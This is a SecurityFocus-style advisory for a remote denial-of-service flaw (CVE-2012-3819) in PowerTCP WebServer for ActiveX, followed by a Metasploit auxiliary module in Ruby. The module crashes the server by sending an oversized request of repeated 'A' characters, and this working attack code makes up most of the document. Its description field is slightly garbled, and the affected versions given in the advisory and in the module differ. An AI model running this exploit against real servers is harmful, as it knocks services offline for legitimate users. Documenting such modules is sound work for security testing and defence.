source: http://www.securityfocus.com/bid/55761/info

PowerTCP WebServer for ActiveX is prone to a remote denial-of-service vulnerability.

Attackers can exploit this issue to crash the application (typically Internet Explorer), denying service to legitimate users.

PowerTCP WebServer for ActiveX 1.9.2 is vulnerable; other versions may also be affected. 

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
include Msf::Exploit::Remote::Tcp
include Msf::Auxiliary::Dos

def initialize(info = {})
    super(update_info(info,
        'Description' => %q{ 'Name' => 'Dart Webserver
<= 1.9.0 Stack Overflow',
        Dart Webserver from Dart Communications throws a stack
overflow exception
        when processing large requests.
    }
    ,
    'Author' => [
    'catatonicprime'
    ],
    'Version' => '$Revision: 15513 $',
    'License' => MSF_LICENSE,
    'References' => [
        [ 'CVE', '2012-3819' ],
        ],
    'DisclosureDate' => '9/28/2012'))

    register_options([
        Opt::RPORT(80),
        OptInt.new('SIZE', [ true, 'Estimated stack size to exhaust',
'520000' ])
    ])
    end
    def run
        serverIP = datastore['RHOST']
        if (datastore['RPORT'].to_i != 80)
            serverIP += ":" + datastore['RPORT'].to_s
        end
        size = datastore['SIZE']

        print_status("Crashing the server ...")
        request = "A" * size + "\r\n\r\n"
        connect
        sock.put(request)
        disconnect

    end
end 